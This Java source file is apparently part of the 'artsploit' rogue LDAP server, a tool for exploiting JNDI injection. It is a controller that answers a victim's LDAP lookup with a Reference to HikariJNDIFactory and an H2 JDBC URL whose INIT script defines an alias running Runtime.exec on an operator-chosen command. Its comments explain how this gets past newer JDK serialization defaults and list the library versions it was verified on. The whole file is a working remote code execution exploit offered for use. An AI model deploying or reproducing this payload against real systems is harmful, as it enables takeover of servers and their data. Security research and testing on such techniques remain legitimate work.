package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

/**
 *
 * RCE by controlling the JDBC URL (connection string) of HikariJNDIFactory.
 * This version uses a Reference with the factory class name directly in the LDAP entry
 * rather than serialized data which is blocked by default in recent JDK versions.

 * Uses the same H2 SQL injection technique as HikariCPH2 but works with
 * newer JDK versions where com.sun.jndi.ldap.object.trustSerialData=false

 * Requires:
 *  HikariCP and H2 in classpath

 * Verified On:
 *  - com.zaxxer:HikariCP:4.0.3
 *  - com.h2database:h2:2.1.214

 * call stack from Java Temurin-17.0.14+7
 * java.lang.Runtime.exec(Runtime.java:315)
 * org.h2.dynamic.EXEC.shellexec(EXEC.java:6)
 * jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)
 * jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
 * jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
 * java.lang.reflect.Method.invoke(Method.java:569)
 * org.h2.schema.FunctionAlias$JavaMethod.execute(FunctionAlias.java:495)
 * org.h2.schema.FunctionAlias$JavaMethod.getValue(FunctionAlias.java:345)
 * org.h2.expression.function.JavaFunction.getValue(JavaFunction.java:40)
 * org.h2.command.dml.Call.query(Call.java:70)
 * org.h2.command.CommandContainer.query(CommandContainer.java:251)
 * org.h2.command.CommandList.executeRemaining(CommandList.java:56)
 * org.h2.command.CommandList.update(CommandList.java:66)
 * org.h2.command.Command.executeUpdate(Command.java:252)
 * org.h2.engine.Engine.openSession(Engine.java:279)
 * org.h2.engine.Engine.createSession(Engine.java:201)
 * org.h2.engine.SessionRemote.connectEmbeddedOrServer(SessionRemote.java:338)
 * org.h2.jdbc.JdbcConnection.<init>(JdbcConnection.java:122)
 * org.h2.Driver.connect(Driver.java:59)
 * com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:138)
 * com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:364)
 * com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:206)
 * com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:476)
 * com.zaxxer.hikari.pool.HikariPool.checkFailFast(HikariPool.java:561)
 * com.zaxxer.hikari.pool.HikariPool.<init>(HikariPool.java:115)
 * com.zaxxer.hikari.HikariDataSource.<init>(HikariDataSource.java:81)
 * com.zaxxer.hikari.HikariJNDIFactory.createDataSource(HikariJNDIFactory.java:71)
 * com.zaxxer.hikari.HikariJNDIFactory.getObjectInstance(HikariJNDIFactory.java:59)
 * javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:193)
 * com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1114)
 */

@LdapMapping(uri = {"/o=hikaricp-h2-local-factory"})
public class HikariCPH2LocalFactory implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP Reference result for " + base + " with hikaricp-h2-ref payload");

        Entry e = new Entry(base);

        // Set the object class to create a Reference
        e.addAttribute("objectClass", "javaNamingReference");

        // Set the Java class name to load
        e.addAttribute("javaClassName", "javax.sql.DataSource");

        // Specify the factory class directly
        e.addAttribute("javaFactory", "com.zaxxer.hikari.HikariJNDIFactory");

        // The H2 JDBC URL with embedded code execution
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS IF NOT EXISTS EXEC AS " +
                "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
                "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";

        System.out.println("[DEBUG] Created JDBC URL: " + url);

        // Format should be exactly: "#[index]#[type]#[content]"
        // This matches what Java's LDAP reference parser expects
        e.addAttribute("javaReferenceAddress", "#0#jdbcUrl#" + url);
        e.addAttribute("javaReferenceAddress", "#1#driverClassName#org.h2.Driver");
        e.addAttribute("javaReferenceAddress", "#2#username#root");
        e.addAttribute("javaReferenceAddress", "#3#password#password");
        e.addAttribute("javaReferenceAddress", "#4#autoCommit#true");
        e.addAttribute("javaReferenceAddress", "#5#maximumPoolSize#1");

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
